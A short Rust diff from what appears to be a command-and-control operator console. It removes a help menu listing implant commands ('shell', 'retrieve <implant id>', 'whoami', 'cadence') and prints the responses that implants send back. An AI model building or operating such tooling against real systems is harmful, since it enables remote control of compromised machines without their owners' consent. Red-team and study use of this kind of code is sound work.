@@ -33,34 +33,15 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             1 => (RsOperatorCommand::from(split_line[0].trim()).into(), "".to_string()),
             _ => (RsOperatorCommand::from(split_line[0].trim()).into(), split_line[1].trim().to_string()),
         };
-        match command {
-            OperatorCommand::OpNone => continue,
-            OperatorCommand::OpQuit => break,
-            OperatorCommand::OpHelp => {
-                println!("Valid commands:");
-                println!("\tcadence <number in seconds>");
-                println!("\tdir");
-                println!("\thostname");
-                println!("\thelp");
-                println!("\timplants");
-                println!("\tip");
-                println!("\tls");
-                println!("\tos");
-                println!("\tquit");
-                println!("\tretrieve <implant id>");
-                println!("\tshell");
-                println!("\twhoami");
-                continue
-            },
-            _ => ()
-        }
-        let request= tonic::Request::new(
+        let request = tonic::Request::new(
             OperatorRequest {
                 command: OperatorCommand::try_into(command).unwrap(),
                 arguments
             },
         );
-        let _response = schedule_client.send(request).await?.into_inner();
+        let response = schedule_client.send(request).await?.into_inner();
+        let print_for_operator = response.data;
+        println!("{print_for_operator}");
     }
 
     Ok(())
